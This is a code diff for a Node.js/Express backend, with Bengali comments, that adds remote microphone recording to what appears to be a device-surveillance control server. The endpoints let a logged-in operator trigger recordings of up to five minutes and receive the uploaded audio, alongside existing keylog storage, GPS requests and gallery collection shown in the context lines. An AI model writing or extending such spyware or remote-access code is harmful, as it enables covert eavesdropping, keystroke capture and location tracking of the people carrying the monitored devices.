@@ -4,6 +4,8 @@ const { Pool } = require("pg");
 const bcrypt = require("bcrypt");
 const session = require("express-session");
 const pgSession = require("connect-pg-simple")(session);
+const multer = require('multer');
+const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -16,6 +18,20 @@ const pool = new Pool({
 
 app.use(express.json({ limit: '20mb' }));
 app.use(express.urlencoded({ extended: true }));
+
+// অডিও আপলোড স্টোরেজ
+const audioStorage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    const dir = path.join(__dirname, 'uploads', 'audio');
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    cb(null, dir);
+  },
+  filename: (req, file, cb) => {
+    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+    cb(null, 'audio-' + uniqueSuffix + path.extname(file.originalname));
+  }
+});
+const uploadAudio = multer({ storage: audioStorage, limits: { fileSize: 50 * 1024 * 1024 } }); // 50MB
 
 app.use(
   session({
@@ -125,6 +141,7 @@ const deviceUIs = new Map();
 const galleryData = new Map();
 const galleryRequestFlags = new Map();
 const gpsRequestFlags = new Map();
+const audioRequestFlags = new Map(); // নতুন
 
 app.post("/api/device-state", async (req, res) => {
   try {
@@ -307,6 +324,53 @@ app.get("/api/gps/request", async (req, res) => {
   res.json({ requested });
 });
 
+// ================= AUDIO RECORDING =================
+app.post("/api/audio/request", requireLogin, async (req, res) => {
+  try {
+    const { deviceId, duration } = req.body;
+    if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+    if (!duration || isNaN(duration) || duration < 10 || duration > 300) {
+      return res.status(400).json({ error: "Duration must be between 10 and 300 seconds." });
+    }
+    const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+      return res.status(403).json({ error: "Not your device." });
+    }
+    audioRequestFlags.set(deviceId, { requested: true, duration: Math.floor(duration) });
+    res.json({ success: true, requestedDuration: duration });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Audio request failed" }); }
+});
+
+app.get("/api/audio/request", async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const flag = audioRequestFlags.get(deviceId);
+  if (flag) {
+    audioRequestFlags.delete(deviceId);
+    res.json({ requested: true, duration: flag.duration });
+  } else {
+    res.json({ requested: false });
+  }
+});
+
+app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
+  try {
+    const { deviceId, deviceToken } = req.body;
+    if (!deviceId || !deviceToken || !req.file) {
+      return res.status(400).json({ error: "deviceId, deviceToken and audio file required" });
+    }
+    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
+      fs.unlink(req.file.path, () => {});
+      return res.status(401).json({ error: "Invalid device token." });
+    }
+    res.json({ success: true, filePath: req.file.path });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: "Audio upload failed" });
+  }
+});
+
 // ================= KEYLOG CLEANUP (24 HOURS) =================
 setInterval(() => {
   const cutoff = Date.now() - 24 * 60 * 60 * 1000;
@@ -315,7 +379,7 @@ setInterval(() => {
       keylogs.splice(i, 1);
     }
   }
-}, 60 * 60 * 1000); // প্রতি ১ ঘণ্টা পর পর
+}, 60 * 60 * 1000);
 
 // ================= PAGES =================
 app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
